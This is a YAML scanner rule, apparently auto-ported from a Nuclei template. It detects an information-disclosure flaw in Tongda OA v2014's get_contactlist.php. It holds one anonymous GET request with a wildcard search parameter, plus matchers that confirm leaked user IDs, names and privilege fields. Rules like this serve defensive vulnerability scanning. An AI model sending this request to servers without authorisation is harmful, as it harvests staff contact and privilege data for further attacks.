schema_version: 1
id: "cortex.community:tongda-contact-list-exposure"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Tongda OA v2014 Get Contactlistt - Sensitive Information Disclosure"
  description: "There is an information leakage vulnerability in the get_contactlist.php file of Tongda OA v2014. Attackers can obtain sensitive information through the vulnerability and conduct further attacks. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-contact-list-disclosure.yaml"
  tags: ["tongda", "oa", "exposure", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Medium"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "user_uid\":" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "user_name\":" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "priv_name\":" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
